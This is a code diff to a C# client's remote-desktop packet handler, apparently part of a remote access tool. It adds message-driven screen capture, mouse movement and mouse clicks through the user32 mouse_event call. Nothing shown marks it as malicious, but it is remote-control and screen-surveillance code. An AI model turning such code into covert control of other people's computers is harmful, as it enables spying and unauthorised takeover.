@@ -8,23 +8,39 @@ using Client.Helper;
 using System;
 using Client.StreamLibrary.UnsafeCodecs;
 using Client.StreamLibrary;
+using System.Runtime.InteropServices;
 
 namespace Client.Handle_Packet
 {
     public class HandleRemoteDesktop
     {
 
-        //public HandleRemoteDesktop(MsgPack unpack_msgpack)
-        //{
-        //    switch (unpack_msgpack.ForcePathObject("Option").AsString)
-        //    {
-        //        case "capture":
-        //            {
-        //                CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
-        //                break;
-        //            }
-        //    }
-        //}
+        public HandleRemoteDesktop(MsgPack unpack_msgpack)
+        {
+            switch (unpack_msgpack.ForcePathObject("Option").AsString)
+            {
+                case "capture":
+                    {
+                        CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
+                        break;
+                    }
+
+                case "mouseClick":
+                    {
+                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
+                        Cursor.Position = position;
+                        mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
+                        break;
+                    }
+
+                case "mouseMove":
+                    {
+                        Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
+                        Cursor.Position = position;
+                        break;
+                    }
+            }
+        }
         public void CaptureAndSend(int quality, int Scrn)
         {
             TempSocket tempSocket = new TempSocket();
@@ -85,5 +101,8 @@ namespace Client.Handle_Packet
             }
             catch { return new Bitmap(rect.Width, rect.Height); }
         }
+
+        [DllImport("user32.dll")]
+        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
     }
 }
